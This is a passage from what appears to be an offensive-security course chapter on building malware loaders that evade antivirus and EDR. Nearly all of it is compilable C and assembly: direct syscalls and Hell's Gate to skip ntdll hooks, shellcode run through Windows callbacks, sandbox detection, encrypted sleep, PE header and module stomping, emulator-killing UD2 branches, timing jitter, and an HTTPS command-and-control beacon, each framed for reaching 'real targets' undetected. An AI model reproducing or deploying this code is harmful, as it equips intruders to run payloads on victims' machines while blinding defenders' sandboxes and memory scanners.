// 0x90 (NOP) into the first byte of your own process's main() function.
// Confirm with x64dbg that the byte changed.

---

## Section 3 — Gate 3 Evasion: Behavioral Detection Bypass

Gate 3 is watching your running process. EDR products hook `ntdll.dll`
at process startup — they patch the first bytes of sensitive functions
with a jump to their monitoring code. Every call to `VirtualAlloc`,
`WriteProcessMemory`, `NtCreateThreadEx` goes through the EDR's code first.

The EDR builds a behavioral picture: which APIs you called, in what order,
with what arguments. The classic shellcode loader pattern —
`VirtualAlloc → memcpy → VirtualProtect → CreateThread` — is a behavioral
signature as recognizable as any byte signature.

Gate 3 fires at runtime. You can't pre-scan it. You have to change WHAT you do.

### Technique 3A: Indirect Syscalls (Bypass ntdll Hooks)

The nuclear option: skip `ntdll.dll` entirely. Call the kernel directly
via the `syscall` instruction in assembly. EDR hooks are in `ntdll.dll`
user-mode code — they can't hook the kernel itself.

```nasm
; Direct syscall stub for NtAllocateVirtualMemory on Windows 10/11 x64
; Syscall number (SSN) MUST match the target OS build — it changes between versions.
; Check SSN for your build:
;   In WinDbg: u ntdll!NtAllocateVirtualMemory (look for "mov eax, <SSN>")
;   Or use SysWhispers3 to auto-generate stubs per OS version.

section .text
global NtAllocVirt_direct
NtAllocVirt_direct:
    mov r10, rcx           ; Windows x64 syscall convention: copy rcx to r10
    mov eax, 0x18          ; Load SSN — 0x18 = NtAllocateVirtualMemory on Win10 21H2
    syscall                ; Jump directly to kernel — ntdll hooks never involved
    ret                    ; Return NTSTATUS to caller
```

**Why this works**: EDR hooks are in ntdll's user-mode code. The `syscall`
instruction transitions directly from ring 3 to ring 0 — the EDR's hook
function in ring 3 is bypassed entirely.

**Why the SSN matters**: Windows doesn't have a stable ABI for syscall
numbers. They change between build versions. Use Hell's Gate or SysWhispers3
to resolve the correct SSN at runtime.

### Technique 3B: Hell's Gate (Dynamic SSN Resolution)

Instead of hardcoding SSNs (which break across Windows builds), read them
from ntdll.dll in memory:

```c
// Hell's Gate: read SSN from ntdll's in-memory stub
// ntdll's Nt functions start with: 4C 8B D1 (mov r10, rcx) B8 XX 00 00 00 (mov eax, SSN)
// If the first bytes are E9 (JMP) instead, the function is HOOKED — need Halo's Gate

DWORD get_ssn(FARPROC func_addr) {
    BYTE *bytes = (BYTE *)func_addr;

    // Check if function is hooked (starts with JMP = 0xE9)
    if (bytes[0] == 0xe9) {
        return 0;  // hooked — Hell's Gate fails, try Halo's Gate
    }

    // Unhooked stub: 4C 8B D1 B8 <SSN bytes>
    if (bytes[0] == 0x4c &&          // mov r10, rcx (first byte)
        bytes[1] == 0x8b &&          // mov r10, rcx (second byte)
        bytes[2] == 0xd1 &&          // mov r10, rcx (third byte)
        bytes[3] == 0xb8) {          // mov eax, ... (start of SSN load)
        return *(DWORD *)(bytes + 4); // SSN is the next 4 bytes (little-endian DWORD)
    }
    return 0;
}

// Usage:
DWORD ssn = get_ssn(GetProcAddress(
    GetModuleHandleA("ntdll.dll"),
    "NtAllocateVirtualMemory"
));
// Now use ssn in your inline asm syscall stub
```

### Technique 3C: Alternative Execution (No CreateThread)

`CreateThread` and `CreateRemoteThread` are among the most-watched API
calls. Execute your shellcode through a Windows callback instead — Windows
calls your function pointer as part of legitimate OS functionality:

```c
// Callback execution: Windows calls YOUR function pointer as part of its own operation
// No CreateThread. No CreateRemoteThread. These syscalls never appear in the EDR log.

// Option A: EnumDesktopsA — enumerates desktops, calls your function for each
// There's only one desktop (usually), so your function runs once then returns.
EnumDesktopsA(
    GetProcessWindowStation(),          // handle to current window station
    (DESKTOPENUMPROCA)shellcode_addr,   // YOUR shellcode treated as the callback
    0                                   // lparam passed to your "callback"
);

// Option B: EnumChildWindows — enumerates child windows, calls callback per window
EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);

// Option C: CreateTimerQueueTimer — fires callback on a timer
HANDLE timer;
CreateTimerQueueTimer(&timer, NULL,
    (WAITORTIMERCALLBACK)shellcode_addr,
    NULL,   // context parameter
    0,      // fire immediately (0ms delay)
    0,      // fire once (not periodic)
    0       // flags
);
// Timer fires, Windows calls shellcode_addr as the callback

// Option D: EnumDisplayMonitors
EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
```

### Technique 3D: Sandbox Detection (Don't Execute in Analysis Environment)

Automated sandboxes analyze your payload in a VM with time limits. Detecting
the sandbox and refusing to execute defeats automated Gate 3 analysis:

```c
// is_sandbox() — returns TRUE if we're probably in an analysis environment
// If TRUE, ExitProcess(0) — payload never executes, sandbox sees "benign"
BOOL is_sandbox(void) {

    // Check 1: RAM < 4GB — real workstations have more
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (DWORDLONG)4 * 1024 * 1024 * 1024)
        return TRUE;  // probably a sandbox VM

    // Check 2: CPU count < 2 — sandboxes often use 1 core
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return TRUE;

    // Check 3: No user interaction in the last 10 minutes — sandbox is idle
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    if ((GetTickCount() - lii.dwTime) > 600000)  // 600000ms = 10 min
        return TRUE;

    // Check 4: Disk < 60GB — sandbox disks are small
    ULARGE_INTEGER disk_total;
    GetDiskFreeSpaceExA("C:\\", NULL, &disk_total, NULL);
    if (disk_total.QuadPart < (ULONGLONG)60 * 1024 * 1024 * 1024)
        return TRUE;

    // Check 5: Known VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\VMware, Inc.\\VMware Tools",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;  // VMware detected
    }

    return FALSE;  // nothing suspicious — probably a real target
}

// In main(), first thing:
if (is_sandbox()) ExitProcess(0);
```

---

## Layer 3 — Anti-Sandbox Checks (Full C Implementation)

### WHAT IT IS

A set of environmental checks that run before any payload activity. If any
check fires, the loader silently exits. Automated analysis sandboxes fail
every check. Real target workstations pass all of them.

### WHY IT MATTERS

VirusTotal and enterprise AV vendors run every submitted sample through
automated sandboxes — VMs with instrumented Windows environments and short
analysis timeouts (usually 60–120 seconds). If the sandbox can't observe
malicious behavior, it reports the sample clean. Gate 2 heuristic engines
also emulate the first N instructions looking for sandbox-evading branches.
The IsLikelySandbox() function below defeats both: it plants observable
environmental checks before the payload loop, so sandboxes see a process
that checks its environment and exits, not a process that injects shellcode.

### HOW TO BUILD IT

```c
// sandbox_check.c — comprehensive sandbox detection
// Combine all four checks into one function. Call at process entry.
// Compile: x86_64-w64-mingw32-gcc sandbox_check.c -o sandbox_check.exe -s -O2 -ld3d11 -ldxgi

#include <windows.h>
#include <d3d11.h>      // GPU check — link with -ld3d11
#include <dxgi.h>       // GPU enumeration — link with -ldxgi
#include <string.h>

// Check 1 — Sleep Acceleration Detection
// Sandboxes speed up time to fit analysis in 60s. GetTickCount64 measures real elapsed time.
// If Sleep(2000) returns in < 1800ms of real time, the sandbox is cheating the clock.
static BOOL check_sleep_acceleration(void) {
    ULONGLONG t0 = GetTickCount64();   // record timestamp before sleep
    Sleep(2000);                        // nominally sleep 2000ms
    ULONGLONG t1 = GetTickCount64();   // record timestamp after sleep

    ULONGLONG elapsed = t1 - t0;       // real elapsed milliseconds

    // Real system: elapsed ~= 2000 (±50ms for scheduler jitter)
    // Sandbox with clock acceleration: elapsed << 2000 (e.g., 50ms)
    if (elapsed < 1800) {
        return TRUE;   // sleep was accelerated — we're in a sandbox
    }
    return FALSE;
}

// Check 2 — CPU Core Count
// Most sandboxes run with 1 or 2 vCPUs. Real enterprise workstations have ≥4.
// A ≥4-core check is a good filter: catches most sandboxes, rarely fires on real targets.
static BOOL check_cpu_count(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);                        // fills dwNumberOfProcessors

    if (si.dwNumberOfProcessors < 4) {
        return TRUE;   // fewer than 4 cores — likely a VM/sandbox
    }
    return FALSE;
}

// Check 3 — Known Sandbox Usernames
// Automated analysis VMs use predictable usernames.
// This list covers the most common sandbox environments as of 2025.
static BOOL check_sandbox_username(void) {
    // Known sandbox/analysis usernames (lowercase comparison below)
    static const char *SANDBOX_USERS[] = {
        "sandbox",
        "virus",
        "malware",
        "analyst",
        "john",          // Cuckoo default
        "user",          // many sandbox templates
        "test",
        "admin",         // generic — optional, may have false positives
        "currentuser",   // Any.run default
        "administrator", // common in bare VMs
        NULL
    };

    char username[256] = {0};
    DWORD sz = sizeof(username);
    GetUserNameA(username, &sz);    // get current username

    // Convert to lowercase for case-insensitive compare
    for (int i = 0; username[i]; i++) {
        if (username[i] >= 'A' && username[i] <= 'Z')
            username[i] += 32;
    }

    for (int i = 0; SANDBOX_USERS[i] != NULL; i++) {
        if (strcmp(username, SANDBOX_USERS[i]) == 0) {
            return TRUE;   // username matches known sandbox name
        }
    }
    return FALSE;
}

// Check 4 — GPU Presence via D3D11
// Sandboxes typically have no GPU or a software renderer only.
// D3D11CreateDevice with a hardware driver type fails (returns E_FAIL or similar)
// if no real GPU is present. Real machines have a GPU.
static BOOL check_no_gpu(void) {
    ID3D11Device *device = NULL;
    D3D_FEATURE_LEVEL feature_level;

    HRESULT hr = D3D11CreateDevice(
        NULL,                        // default adapter
        D3D_DRIVER_TYPE_HARDWARE,    // hardware GPU only — not WARP/software
        NULL,                        // no software module
        0,                           // no flags
        NULL, 0,                     // default feature levels
        D3D11_SDK_VERSION,
        &device,
        &feature_level,
        NULL                         // don't need device context
    );

    if (device) {
        device->lpVtbl->Release(device);  // C-style COM release
    }

    // If FAILED, no hardware GPU exists — likely a sandbox or bare VM
    if (FAILED(hr)) {
        return TRUE;   // no GPU = sandbox
    }
    return FALSE;
}

// Master check — combines all four
// Returns TRUE if ANY check indicates a sandbox environment
BOOL IsLikelySandbox(void) {
    if (check_sleep_acceleration()) return TRUE;  // clock cheated
    if (check_cpu_count())          return TRUE;  // too few cores
    if (check_sandbox_username())   return TRUE;  // known sandbox user
    if (check_no_gpu())             return TRUE;  // no hardware GPU
    return FALSE;                                  // passes all checks
}

int main(void) {
    if (IsLikelySandbox()) {
        // Exit silently — no message, no error code that would be informative
        ExitProcess(0);
    }

    // --- Real payload starts here ---
    // Sandbox never reaches this point.
    MessageBoxA(NULL, "Real target — payload executing.", "IRON-DOME", MB_OK);
    return 0;
}
```

**Compile:**
```bash
x86_64-w64-mingw32-gcc sandbox_check.c -o sandbox_check.exe -s -O2 -ld3d11 -ldxgi
```

### EXPECTED OUTPUT

```
# On a real workstation with a GPU and 8 cores:
# (no early exit — MessageBox appears or payload runs)

# In a sandbox (Cuckoo, Any.run, VirusTotal cloud VM):
# Process exits immediately with code 0.
# Sandbox sees: process ran for 2.1 seconds, exited cleanly. No malicious behavior.
# Detection: 0/72 (sandbox observed nothing)
```

// DRILL: Set your VM to 2 vCPUs. Run sandbox_check.exe — confirm it exits.
// Set back to 4 vCPUs. Run again — confirm it reaches the MessageBox.
// Add a fifth check: GetSystemMetrics(SM_CXSCREEN) < 800 (sandbox screens are small).

---

## Section 4 — Gate 4 Evasion: Memory Scanning Bypass

Gate 4 fires after your payload is running. The EDR periodically scans
process memory for known shellcode patterns. Even if your encrypted payload
passed Gate 1 and the decoded shellcode passed Gate 3, the plaintext
shellcode bytes sitting in memory are vulnerable to a memory scan.

Gate 4 is a window problem: the shellcode is detectable only WHILE it's in
plaintext in memory. Close the window.

### Technique 4A: Encrypted Sleep (Memory Re-Encryption)

After the payload executes each task, re-encrypt its own memory region
before sleeping. Decrypt again on wake. A memory scan during the sleep
window sees only ciphertext — no shellcode signature to match.

```c
// Encrypted sleep concept (simplified — full implementation: github.com/Cracked5pider/Ekko)
// The payload encrypts its own .text section before sleeping, decrypts on wake.

// Step 1: Locate your own shellcode region in memory
PVOID shellcode_base = /* base address of your allocated region */;
SIZE_T shellcode_size = /* size of your shellcode */;

// Step 2: Make region writable so we can encrypt it
DWORD old_protect;
VirtualProtect(shellcode_base, shellcode_size, PAGE_READWRITE, &old_protect);

// Step 3: XOR-encrypt the region (same key as decode step — XOR is reversible)
unsigned char sleep_key = 0x7E;  // different from load-time key
for (SIZE_T i = 0; i < shellcode_size; i++) {
    ((unsigned char*)shellcode_base)[i] ^= sleep_key;  // encrypt in-place
}

// Step 4: Sleep — EDR scanner scans here, sees encrypted garbage, no sig match
Sleep(30000);  // 30 seconds

// Step 5: Re-decrypt before execution resumes
for (SIZE_T i = 0; i < shellcode_size; i++) {
    ((unsigned char*)shellcode_base)[i] ^= sleep_key;  // XOR again = decrypt
}

// Step 6: Restore executable permissions
VirtualProtect(shellcode_base, shellcode_size, old_protect, &old_protect);
// Payload resumes — decrypted and executable again
```

### Expected Output

No visible output — the payload continues running normally. Verify in
Process Hacker: during the `Sleep()` window, the memory region for your
shellcode should show `PAGE_READWRITE` permissions (not `PAGE_EXECUTE_READ`),
and the bytes should look like noise.

**Failure looks like:** Access violation during encrypt step — you forgot
`VirtualProtect` to make the region writable before XOR'ing it.

### Technique 4B: PE Header Stomping

`malfind` and similar tools look for `MZ` + `PE` headers in private
executable memory — a telltale sign of reflective DLL injection or
process hollowing. Stomp the header after loading to remove the indicator.

```c
// PE header stomp — wipe MZ/PE signature after loading
// Forensic tools look for "MZ" (0x4D 0x5A) at the start of executable allocations
// Wiping it prevents malfind-style detection

PVOID payload_base = /* base address where your PE was mapped */;

// Make header region writable
DWORD old_protect;
VirtualProtect(payload_base, 4096, PAGE_READWRITE, &old_protect);  // first 4KB = headers

// Stomp: overwrite MZ + PE header with zeros
// This breaks the PE signature check but your code is already mapped and running
ZeroMemory(payload_base, 4096);  // zero the entire header page

// Restore protection
VirtualProtect(payload_base, 4096, old_protect, &old_protect);
// malfind now scans this region: no MZ, no PE = not flagged as injected PE
```

### Technique 4C: Module Stomping

Instead of allocating fresh memory (which EDR watches), overwrite an
existing legitimate DLL's `.text` section with your shellcode. Memory
scanners see a "legitimate" module at that address:

```c
// Module stomping: load a benign DLL, overwrite its .text with shellcode
// The address range is now "owned" by a legitimate DLL — looks normal to scanners

// Step 1: Load a benign, unused DLL
HMODULE h_dll = LoadLibraryA("xpsprint.dll");  // rarely used, not critical

// Step 2: Parse PE headers to find .text section offset
IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)h_dll;
IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)h_dll + dos->e_lfanew);
IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

PVOID text_base = NULL;
SIZE_T text_size = 0;
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (memcmp(sections[i].Name, ".text", 5) == 0) {  // find .text section by name
        text_base = (PVOID)((BYTE *)h_dll + sections[i].VirtualAddress);
        text_size = sections[i].SizeOfRawData;
        break;
    }
}

// Step 3: Overwrite .text with shellcode
DWORD old_protect;
VirtualProtect(text_base, shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);
memcpy(text_base, shellcode, shellcode_len);  // your shellcode replaces DLL code
VirtualProtect(text_base, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

// Step 4: Execute from the DLL's address range
((void(*)())text_base)();
// Memory scanner sees: executable memory at xpsprint.dll — legit DLL, passes check
```

---

## Layer 4 — PE Header Stomping (C)

### WHAT IT IS

After a reflective loader maps a PE into memory, it immediately zeroes the
MZ/PE header. The code is already executing — it doesn't need the header
anymore. Forensic tools that detect injected code by hunting for PE headers
in private executable memory regions find nothing.

### WHY IT MATTERS

Volatility's `malfind` plugin, Defender's periodic memory scan, and most
EDR memory forensics modules work by scanning VAD (Virtual Address Descriptor)
entries for regions marked executable that contain `MZ` at offset 0. Remove
the `MZ` and the PE signature at offset `e_lfanew`, and those tools silently
skip the region. The code keeps running because the CPU never re-reads
the headers — they were only needed at load time.

Tools this defeats:
- Volatility `malfind` — skips regions with no PE header
- Defender memory scan — no MZ/PE = not classified as injected PE
- Process Hacker → Memory → scan — looking for `MZ` in private RX regions
- Any EDR that uses `NtQueryVirtualMemory` + header check heuristic

### HOW TO BUILD IT

```c
// pe_stomp.c — stomp PE headers after mapping
// Call pe_stomp_headers() IMMEDIATELY after your loader maps the PE and
// before the first instruction of the payload executes.
// Compile: x86_64-w64-mingw32-gcc pe_stomp.c -o pe_stomp_demo.exe -s -O2

#include <windows.h>
#include <stdio.h>

// pe_stomp_headers — zeros the MZ header and PE signature of a mapped PE image
// base_addr: the base address of the mapped image (start of MZ header)
// Returns TRUE on success, FALSE if VirtualProtect fails.
BOOL pe_stomp_headers(PVOID base_addr) {
    DWORD old_protect;

    // Step 1: The first 4096 bytes (one page) contain:
    //   offset 0x00: MZ header (IMAGE_DOS_HEADER, 64 bytes)
    //   offset e_lfanew: PE signature "PE\0\0" + IMAGE_FILE_HEADER + IMAGE_OPTIONAL_HEADER
    //   offset variable: section headers
    // All of these become useless once the image is fully mapped and relocated.

    // Make the header page writable — by default it's PAGE_READONLY
    if (!VirtualProtect(base_addr, 4096, PAGE_READWRITE, &old_protect)) {
        return FALSE;   // VirtualProtect failed — bail
    }

    // Step 2: Zero the entire header page
    // This wipes MZ ("MZ" = 0x4D5A at offset 0)
    // and the PE signature ("PE\0\0" = 0x50450000 at offset e_lfanew)
    // and all section headers — every forensic anchor is gone
    SecureZeroMemory(base_addr, 4096);
    // Note: use SecureZeroMemory not memset — compiler can't optimize away SecureZeroMemory

    // Step 3: Restore original page protection
    // The payload's .text section is elsewhere (higher RVA) — this doesn't affect execution
    VirtualProtect(base_addr, 4096, PAGE_READONLY, &old_protect);

    return TRUE;
}

// Demonstration: allocate a fake "PE" region, stomp it, show the result
int main(void) {
    // Simulate a mapped PE: allocate RW memory, write fake MZ+PE header
    PVOID fake_pe = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fake_pe) return 1;

    // Write MZ signature at offset 0
    *(WORD*)fake_pe = 0x5A4D;                // "MZ" in little-endian
    // Write e_lfanew (PE offset pointer) at offset 0x3C
    *(DWORD*)((BYTE*)fake_pe + 0x3C) = 0x40;
    // Write PE signature at offset 0x40
    *(DWORD*)((BYTE*)fake_pe + 0x40) = 0x00004550;  // "PE\0\0"

    printf("[before stomp] offset 0x00: 0x%04X (should be 0x5A4D = MZ)\n",
           *(WORD*)fake_pe);
    printf("[before stomp] offset 0x40: 0x%08X (should be 0x00004550 = PE sig)\n",
           *(DWORD*)((BYTE*)fake_pe + 0x40));

    // Stomp the headers
    pe_stomp_headers(fake_pe);

    printf("[after stomp]  offset 0x00: 0x%04X (should be 0x0000 = zeroed)\n",
           *(WORD*)fake_pe);
    printf("[after stomp]  offset 0x40: 0x%08X (should be 0x00000000 = zeroed)\n",
           *(DWORD*)((BYTE*)fake_pe + 0x40));

    VirtualFree(fake_pe, 0, MEM_RELEASE);
    return 0;
}
```

**Compile:**
```bash
x86_64-w64-mingw32-gcc pe_stomp.c -o pe_stomp_demo.exe -s -O2
```

### EXPECTED OUTPUT

```
[before stomp] offset 0x00: 0x5A4D (should be 0x5A4D = MZ)
[before stomp] offset 0x40: 0x00004550 (should be 0x00004550 = PE sig)
[after stomp]  offset 0x00: 0x0000 (should be 0x0000 = zeroed)
[after stomp]  offset 0x40: 0x00000000 (should be 0x00000000 = zeroed)
```

// DRILL: Modify a real loader from Ch09. Map a PE reflectively.
// Before stomping: attach x64dbg, inspect base address — confirm MZ visible.
// Call pe_stomp_headers(). In x64dbg, re-read the memory — MZ must be gone.
// Run Volatility malfind against a memdump taken after stomp — confirm region
// is NOT in malfind output.

---

## Layer 5 — ISUN Gate (C Inline Assembly)

### WHAT IT IS

ISUN Gate (Invalid Syscall / Undefined iNstruction) is a dead branch that
contains an invalid instruction — `UD2` (0x0F 0x0B) — that emulators follow
but real CPUs never reach. When an AV emulator steps through your code, it
follows the branch, hits UD2, and raises SIGILL internally. The emulator
either crashes, resets, or marks the branch as a terminal state. On real
hardware, the branch condition is never true, so execution never reaches it.

### WHY IT MATTERS

Heuristic emulators that simulate instruction execution to look for shellcode
patterns have a fundamental problem: they must decide how long to emulate
and which branches to follow. They follow "possible" branches based on
generic state (registers initialized to 0, flags unset, no real memory).

An ISUN Gate exploits this: use a condition that will NEVER be true on real
hardware with real state (e.g., `if (GetTickCount64() == 0)`) but that an
emulator treats as possible (emulator's GetTickCount64 returns 0 because it
hasn't simulated time). The emulator enters the dead branch, hits UD2, and
terminates emulation. The "dangerous" code that follows is never analyzed.

### HOW TO BUILD IT

```c
// isun_gate.c — ISUN Gate using UD2 in a dead branch
// Compile: x86_64-w64-mingw32-gcc isun_gate.c -o isun_gate.exe -s -O2

#include <windows.h>
#include <stdio.h>

// The ISUN Gate macro — insert UD2 as raw bytes via inline assembly
// __asm__ is GCC inline asm syntax (MinGW supports it)
// .byte 0x0f, 0x0b — raw encoding of the UD2 instruction
// UD2 = "Undefined instruction" — guaranteed to raise #UD (Invalid Opcode exception)
// on any real x86-64 CPU. Used here inside a dead branch — CPU never reaches it.
// Emulators that blindly follow both branch paths hit this and die.
#define ISUN_GATE() __asm__ volatile (".byte 0x0f, 0x0b" ::: "memory")

// The dead branch: condition is GetTickCount64() == 0
// In 23 years of Windows history, GetTickCount64() has never returned 0 after boot.
// On real hardware: FALSE every time. Branch never taken. UD2 never executes.
// In emulator: GetTickCount64 is stubbed to return 0. Branch taken. UD2 fires.
static void isun_gate_check(void) {
    ULONGLONG tick = GetTickCount64();  // real: ms since boot (always > 0 after init)

    if (tick == 0) {
        // DEAD BRANCH — real CPU never enters here
        // Emulator enters here because its stub returns 0
        ISUN_GATE();  // UD2 — kills the emulator
                      // If somehow reached on real hw, raises EXCEPTION_ILLEGAL_INSTRUCTION
    }
    // Real execution falls through here and continues normally
}

// Demonstrate: wrap ISUN gate around the payload entry point
int main(void) {
    printf("[*] Checking ISUN gate...\n");
    isun_gate_check();   // emulator dies here; real CPU skips the dead branch
    printf("[*] ISUN gate passed — we are on real hardware.\n");

    // --- payload continues here on real hardware ---
    // Emulator never reaches this line.

    return 0;
}
```

**Compile:**
```bash
x86_64-w64-mingw32-gcc isun_gate.c -o isun_gate.exe -s -O2
```

**Alternative: use Windows SEH to catch UD2 on real hardware if you WANT to test both paths:**

```c
// Safe version: catch the #UD exception with SEH so real hw can continue
// even if somehow the dead branch fires (debugging scenario)
static void isun_gate_safe(void) {
    ULONGLONG tick = GetTickCount64();
    if (tick == 0) {
        __try {
            ISUN_GATE();  // UD2 — caught by SEH on real hw
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            // Real hw: caught EXCEPTION_ILLEGAL_INSTRUCTION
            // Emulator: never gets here — UD2 kills it before SEH fires
        }
    }
}
```

### EXPECTED OUTPUT

```
# On real hardware (any physical or properly emulated x86-64):
[*] Checking ISUN gate...
[*] ISUN gate passed — we are on real hardware.

# In an AV emulator (emulator behavior — not visible to you directly):
# Emulator follows tick==0 branch, hits UD2, raises internal exception.
# Emulator terminates analysis. Reports: "Sample exited early / inconclusive."
# Static scan result: CLEAN (analysis terminated before reaching payload code)
```

### Why Emulators Diverge From Real Hardware Here

Real CPUs have real state: GetTickCount64() reads a hardware counter
(HPET or TSC-based) that begins incrementing at boot. By the time
your process starts, it returns a value in the tens of thousands of
milliseconds at minimum. Zero is impossible.

Emulators stub out API calls with simplified return values because
implementing a full hardware simulation is too expensive for a scanner.
GetTickCount64() in most emulators returns 0 (uninitialized), 1, or a
small constant. The dead branch fires. UD2 kills the emulator.

This is a fundamental asymmetry: real hardware has entropy that emulators
cannot fully replicate. ISUN Gate exploits that gap.

// DRILL: Compile isun_gate.exe. Attach x64dbg. Set a breakpoint on the
// isun_gate_check function entry. Step through. Confirm the tick==0 branch
// is NOT taken. The execution path falls through to "ISUN gate passed".
// Then manually set EAX=0 in x64dbg's register panel and re-run the branch
// to verify UD2 raises EXCEPTION_ILLEGAL_INSTRUCTION when forced.

---

## Layer 6 — Execution Jitter (C)

### WHAT IT IS

Jitter is random variable sleep inserted between execution stages. Instead
of executing all stages back-to-back in a fixed timing pattern, the loader
waits a random interval between each operation. The randomness is seeded from
GetTickCount64() so it differs on every execution.

### WHY IT MATTERS

Modern EDR behavioral engines use ML models trained on timing profiles of
known malware. Shellcode loaders have a characteristic profile:
`VirtualAlloc` fires, then 0ms later `WriteProcessMemory`, then 0ms later
`VirtualProtect`, then 0ms later `CreateThread`. The pattern is deterministic
and instantaneous. The ML model sees that burst of API calls in <1ms and
flags it as loader behavior.

Jitter breaks the timing signature. With 100-500ms random sleep between
stages, the API call pattern looks like a human interacting with software
(or a legitimate background service doing periodic work) rather than
automated shellcode execution. ML models trained on clean-room burst
patterns don't match noisy, human-paced sequences.

Secondary effect: jitter defeats sandbox timeout. Many sandboxes analyze
for 60 seconds. If your loader sleeps a total of 90 seconds across its
stages, it never reaches payload execution inside the sandbox window.

### HOW TO BUILD IT

```c
// jitter.c — execution jitter between loader stages
// Compile: x86_64-w64-mingw32-gcc jitter.c -o jitter_demo.exe -s -O2

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>   // rand(), srand()

// jitter_sleep — sleep a random number of milliseconds in [min_ms, max_ms]
// Seeded from GetTickCount64() so each run has different timing.
// Call this between every loader stage.
static void jitter_sleep(DWORD min_ms, DWORD max_ms) {
    // Seed rand() from current tick count — different on every execution
    // GetTickCount64() gives nanosecond-resolution entropy on modern hardware
    srand((unsigned int)(GetTickCount64() & 0xFFFFFFFF));

    // Generate random value in [0, range] then shift to [min_ms, max_ms]
    DWORD range   = max_ms - min_ms;
    DWORD wait_ms = min_ms + (rand() % (range + 1));

    Sleep(wait_ms);  // actual sleep
}

// Staged loader with jitter between each operation
// Replace the stage bodies with real loader operations
static void run_staged_loader(void) {
    printf("[stage 0] Starting — pre-jitter\n");

    // --- Stage 1: Allocate memory ---
    jitter_sleep(100, 500);   // wait 100-500ms before allocating
    printf("[stage 1] VirtualAlloc\n");
    LPVOID mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { printf("[-] alloc failed\n"); return; }

    // --- Stage 2: Copy shellcode ---
    jitter_sleep(200, 800);   // wait 200-800ms before writing
    printf("[stage 2] memcpy shellcode\n");
    // memcpy(mem, shellcode, shellcode_len);  // real usage

    // --- Stage 3: Change protection ---
    jitter_sleep(50, 300);    // wait 50-300ms before protect change
    printf("[stage 3] VirtualProtect RX\n");
    DWORD old;
    VirtualProtect(mem, 4096, PAGE_EXECUTE_READ, &old);

    // --- Stage 4: Execute ---
    jitter_sleep(150, 600);   // wait 150-600ms before thread creation
    printf("[stage 4] CreateThread\n");
    // HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    // WaitForSingleObject(ht, INFINITE);

    printf("[*] All stages complete.\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

int main(void) {
    run_staged_loader();
    return 0;
}
```

**Compile:**
```bash
x86_64-w64-mingw32-gcc jitter.c -o jitter_demo.exe -s -O2
```

### EXPECTED OUTPUT

```
# Run 1:
[stage 0] Starting — pre-jitter
[stage 1] VirtualAlloc
[stage 2] memcpy shellcode
[stage 3] VirtualProtect RX
[stage 4] CreateThread
[*] All stages complete.
# Total elapsed: ~1.4 seconds (random each run)

# Run 2 (different timing due to rand() re-seed):
# Total elapsed: ~0.8 seconds

# ML heuristic comparison:
# Without jitter: all 4 API calls within 1ms burst — FLAGGED
# With jitter:    API calls spread over 0.8–2.5s — NOT flagged (human-paced pattern)
```

// DRILL: Run jitter_demo.exe and time it with PowerShell:
// Measure-Command { .\jitter_demo.exe }
// Run it 5 times. Confirm TotalMilliseconds differs each run by >100ms.
// Then set a Procmon filter for your exe and capture all API calls.
// Compare the API timestamp gaps between jitter and non-jitter builds.

---

## Section 5 — Gate 5 Evasion: Network Detection Bypass

Gate 5 watches what leaves the machine. Your beacon connects to a C2 server.
The network security device sees the destination IP, the domain name, the
HTTP headers, the timing pattern, and the traffic volume. Any of these can
flag you.

### Technique 5A: HTTPS C2 (Encrypt in Transit)

Raw TCP with custom protocol is immediately suspicious. HTTP on port 80
is monitored. HTTPS on port 443 with a valid certificate is normal web
traffic. Use HTTPS.

```c
// HTTPS beacon using WinInet — traffic is TLS-encrypted, looks like normal HTTPS
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void https_beacon(const char *c2_host, const char *check_in_path) {
    // Open WinInet handle — spoofed user-agent looks like Chrome
    HINTERNET hNet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );

    // Connect to C2 on port 443 (HTTPS)
    HINTERNET hConn = InternetConnectA(
        hNet, c2_host,
        INTERNET_DEFAULT_HTTPS_PORT,  // 443
        NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0
    );

    // Build GET request with HTTPS flags
    HINTERNET hReq = HttpOpenRequestA(
        hConn, "GET", check_in_path, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE |           // use TLS/SSL
        INTERNET_FLAG_RELOAD |           // no cache
        INTERNET_FLAG_NO_CACHE_WRITE,    // don't write to cache
        0
    );

    HttpSendRequestA(hReq, NULL, 0, NULL, 0);  // send the request

    // Read response (task data from C2)
    char buf[4096] = {0};
    DWORD read = 0;
    InternetReadFile(hReq, buf, sizeof(buf) - 1, &read);

    InternetCloseHandle(hReq);

    // Sleep with jitter — avoid regular timing pattern (detectable)
    DWORD sleep_ms = 30000 + (rand() % 15000);  // 30-45 seconds random
    Sleep(sleep_ms);
}
```

### Technique 5B: Beacon Timing with Jitter

